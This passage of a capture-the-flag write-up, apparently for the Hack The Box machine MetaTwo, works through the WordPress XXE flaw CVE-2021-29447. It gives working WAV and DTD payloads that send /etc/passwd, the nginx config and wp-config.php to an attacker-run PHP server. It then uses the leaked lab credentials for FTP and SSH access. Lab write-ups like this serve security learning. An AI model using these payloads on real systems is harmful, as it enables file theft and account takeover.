+<li><em>Server-Side Request Forgery (SSRF)</em>: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.</li>
+</ul>
+<p>This is my first XXE attack! And it's also a pending subject for me because I was asked about it in a job interview for a pentester position and I didn't know how to answer. Great! No pain. Let's get our hands dirty =)</p>
+<p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">Wpscan</a> provides us with a Proof Of Concept (POC):</p>
+<ol>
+<li>Create payload.wav:</li>
+</ol>
+<pre><code>RIFFXXXXWAVEBBBBiXML&lt;!DOCTYPE r [
+
+&lt;!ELEMENT r ANY &gt;
+
+&lt;!ENTITY % sp SYSTEM &quot;http://attacker-url.domain/xxe.dtd&quot;&gt;
+
+%sp;
+
+%param1;
+
+]&gt;
+
+&lt;r&gt;&amp;exfil;&lt;/r&gt;&gt;
+</code></pre>
+<ol>
+<li>Create xxe.dtd, the file we're going to serve:</li>
+</ol>
+<pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php&quot;&gt;
+
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'&gt;&quot;&gt;
+</code></pre>
+<p>My IP is 10.10.14.33 and I will be using port 1234 and "xxe.dtd" as the name of the file in my server, so payload.wav would be (using flag -en to encode characters):</p>
+<pre><code class="language-bash">echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '&quot;'&quot;'http://10.10.14.33:1234/xxe.dtd'&quot;'&quot;'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav
+</code></pre>
+<p>And my xxe.dtd file if I want to get the /etc/password file:</p>
+<pre><code>&lt;&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;&quot; &gt;
+</code></pre>
+<p>Now, in the same folder where we have saved xxe.dtd, run a php server. In my case:</p>
+<pre><code class="language-bash">php -S 10.10.14.33:1234
+</code></pre>
+<p>Now we are ready to upload payload.wav in http://metapress.htb/wp-admin/upload.php. After we do, in the command line from we were serving our xxe.dtd file, we can read:</p>
+<pre><code>10.10.11.186:39962 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory   
+</code></pre>
+<p>We will use PHP to decode this. Create a .php with the following code, just be sure to copy and paste the base64 returned from the WordPress server where we have 'base64here' in the example code:</p>
+<pre><code class="language-php">&lt;?php echo zlib_decode(base64_decode('base64here')); ?&gt;
+</code></pre>
+<p>In my case, I will call the file code.php, and it will have the following php content:</p>
+<pre><code class="language-php">&lt;?php echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='); ?&gt;
+</code></pre>
+<p>Give executable permission to th file code.php and execute it:</p>
+<pre><code class="language-bash">chmod +x code.php
+php code.php
+</code></pre>
+<p>Results:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+</code></pre>
+<p>Users with access to the bash terminal would be: root and jnelson. Noted!</p>
+<p>To request different content to the WordPress server, we only need to modify our xxe.dtd file and instead of "/etc/passwd", use a different path. Common files to check out are:</p>
+<ul>
+<li>username/.ssh/id_rsa.pub: with this, we could try to login into the ssh server.</li>
+<li>/etc/shadow: to extract hashes.</li>
+<li>In a WordPress server: wp-config.php: inhere you could find some credentials.</li>
+<li>Logs and more...</li>
+</ul>
+<p>Let's start with wp-config.php. We know from previous scans that the WordPress installation is running on a nginx server. Also, we know that wp-cofig.php file is always located at the root of the WordPress installation. Reading at the documentation, we can see that nginx server has a file that displays the enabled sites and provides an absolute path to them. That file is "/etc/nginx/sites-enabled/default". So, with that in mind, we can craft our xxe-nginx.dtd file with this content:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;&quot; &gt;
+</code></pre>
+<p>And for our payload-nginx.wav, we run:</p>
+<pre><code class="language-bash">echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '&quot;'&quot;'http://10.10.14.33:1234/xxe-nginx.dtd'&quot;'&quot;'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav
+</code></pre>
+<p>Now, we start our php server:</p>
+<pre><code class="language-bash">php -S 10.10.14.33:1234
+</code></pre>
+<p>After uploading payload-nginx-wav from http://metapress.htb/wp-admin/upload.php, our php server will display:</p>
+<pre><code>10.10.11.186:45010 [404]: GET /?p=XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0J4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/ - or directory
+</code></pre>
+<p>With this code, we craft the file code-nginx.php and give it execution permissions:</p>
+<pre><code class="language-bash">nano code-nginx.php
+</code></pre>
+<p>The content of the file will be:</p>
+<pre><code>&lt;?php echo zlib_decode(base64_decode('XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkybT0n37IK2qrpaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNpQBPL7D4x7ZYRTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0RpbBGRYbs2qsdJ4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/')); ?&gt;
+</code></pre>
+<p>Then we run:</p>
+<pre><code class="language-bash">php code-nginx.php
+</code></pre>
+<p>Results:</p>
+<pre><code>server {
+
+        listen 80;
+        listen [::]:80;
+
+        root /var/www/metapress.htb/blog;
+
+        index index.php index.html;
+
+        if ($http_host != &quot;metapress.htb&quot;) {
+                rewrite ^ http://metapress.htb/;
+        }
+
+        location / {
+                try_files $uri $uri/ /index.php?$args;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
+        }
+
+        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+                expires max;
+                log_not_found off;
+        }
+
+}
+</code></pre>
+<p>Nice, now we know that root is set to "/var/www/metapress.htb/blog" (line 6 of the code). With this, we also know wp-config.php file's location (/var/www/metapress.htb/blog/wp-config.php. </p>
+<p>Following previous steps, now we need to craft:</p>
+<ul>
+<li>payload-wpconfig.wav file: to upload it to http://metapress.htb/wp-admin/upload.php.</li>
+<li>xxe-wpconfig.dtd file: that we will serve with a php server.</li>
+</ul>
+<p>Let's craft xxe-wpconfig.dtd:</p>
+<pre><code>NTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'&gt;&quot; &gt;
+</code></pre>
+<p>Now, craft the payload-wpconfig.wav file:</p>
+<pre><code class="language-bash">echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '&quot;'&quot;'http://10.10.14.33:1234/xxe-wpconfig.dtd'&quot;'&quot;'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload-wpconfig.wav
+</code></pre>
+<p>Launch the php server from the folder where we want to share the file xxe-wpconfig.dtd:</p>
+<pre><code class="language-bash">php -S 10.10.14.33:1234
+</code></pre>
+<p>After uploading our payload-wpconfig.wav file from http://metapress.htb/wp-admin/upload.php, we can read from the command line from where we launched the php server:</p>
+<pre><code>10.10.11.186:57388 [404]: GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== - No such file or directory
+</code></pre>
+<p>With this, prepare the php file code-wpconfig.php to execute and extract the content. The content of the code-wpconfig.php file would be:</p>
+<pre><code>&lt;?php echo zlib_decode(base64_decode('jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==')); ?&gt;
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">php code-wpconfig.php
+</code></pre>
+<p>Results are the content of the wp-config.php file of the wordpress installation:</p>
+<pre><code class="language-php">&lt;?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );
+define( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+</code></pre>
+<p>Some lines are different from the regular wp-config.php file of a Wordpress installation. They also provide credentials to access an ftp server:</p>
+<pre><code>define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+</code></pre>
+<p>So... let's connect us to the ftp server:</p>
+<pre><code class="language-bash">ftp 10.10.11.186
+
+# After this we will be asked for out username and password.
+# Enter username: metapress.htb
+# Enter password: 9NYS_ii@FyL_p5M2NvJ
+</code></pre>
+<p>We can access two folders in the ftp server: blog and mailer. After browsing and inspecting the files, there is one that catches my attention: /mailer/sent_email.php. To get the file, run from the ftp server command line:</p>
+<pre><code class="language-ftp">mget send_email.php
+</code></pre>
+<p>From our attacking machine we can see the content of that file:</p>
+<pre><code class="language-bash">cat send_email.php
+</code></pre>
+<p>Results:</p>
+<pre><code class="language-php">&lt;?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+$mail = new PHPMailer(true);
+
+$mail-&gt;SMTPDebug = 3;                               
+$mail-&gt;isSMTP();            
+
+$mail-&gt;Host = &quot;mail.metapress.htb&quot;;
+$mail-&gt;SMTPAuth = true;                          
+$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 
+$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           
+$mail-&gt;SMTPSecure = &quot;tls&quot;;                           
+$mail-&gt;Port = 587;                                   
+
+$mail-&gt;From = &quot;jnelson@metapress.htb&quot;;
+$mail-&gt;FromName = &quot;James Nelson&quot;;
+
+$mail-&gt;addAddress(&quot;info@metapress.htb&quot;);
+
+$mail-&gt;isHTML(true);
+
+$mail-&gt;Subject = &quot;Startup&quot;;
+$mail-&gt;Body = &quot;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&quot;;
+
+try {
+    $mail-&gt;send();
+    echo &quot;Message has been sent successfully&quot;;
+} catch (Exception $e) {
+    echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo;
+}
+</code></pre>
+<p>This script contains credentials of the user jnelson, that we had spotted before in the /etc/passwd file, <strong>but now</strong> we also have his password.</p>
+<p>From the initial enumeration of ports and services in the Metatwo machine, we know that ssh service is running. We try to login in to that service:</p>
+<pre><code class="language-bash">
+# Quick install sshpass if you prefer to enter the ssh connection in one line.
+
+sudo apt install sshpass
+sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@10.10.11.186
+</code></pre>
+<p>Now, you are in jnelson terminal. To get the user's flag, run:</p>
+<pre><code class="language-bash">cat user.txt
+</code></pre>
+<h2 id="getting-the-systems-flag">Getting the System's flag</h2>
+<p>Coming soon.</p>
+<h2 id="some-other-write-ups-and-learning-material-related">Some other write-ups and learning material related</h2>
+<ul>
+<li><a href="https://tryhackme.com/room/wordpresscve202129447">https://tryhackme.com/room/wordpresscve202129447</a></li>
+<li><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">Wpscan: CVE-2021-29447</a></li>
+<li><a href="https://www.maketecheasier.com/pgp-encryption-how-it-works/">https://www.maketecheasier.com/pgp-encryption-how-it-works/</a></li>
+</ul>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "content.code.annotate", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.ba449ae6.min.js"></script>
+      
+    
+  </body>
+</html>
